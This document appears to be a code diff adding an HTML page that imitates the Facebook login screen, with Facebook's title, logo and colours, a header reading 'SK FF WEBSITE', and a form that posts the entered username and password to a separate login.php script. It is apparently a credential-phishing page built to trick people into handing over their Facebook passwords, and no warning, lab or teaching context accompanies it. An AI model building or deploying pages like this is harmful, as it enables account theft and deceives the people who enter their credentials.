@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      background-color: #ffffff;
+      font-family: Helvetica, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+      margin: 0;
+    }
+    .top-bar {
+      width: 100%;
+      padding: 10px;
+      background-color: #1877f2;
+      color: white;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .logo {
+      margin: 30px 0 20px 0;
+    }
+    .login-box {
+      width: 350px;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      background-color: #ffffff;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 16px 14px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      box-sizing: border-box;
+    }
+    .login-box input[type="password"] {
+      margin-bottom: 0;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 14px;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .login-box .forgot {
+      text-align: center;
+      display: block;
+      margin-top: 14px;
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .logo img {
+      height: 60px;
+    }
+  </style>
+</head>
+<body>
+  <div class="top-bar">SK FF WEBSITE</div>
+  <div class="logo">
+    <img src="facebook-logo.png" alt="Facebook">
+  </div>
+  <form class="login-box" action="login.php" method="POST">
+    <input type="text" name="username" placeholder="Mobile number or email" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Log In</button>
+    <a class="forgot" href="#">Forgotten password?</a>
+  </form>
+</body>
+</html>
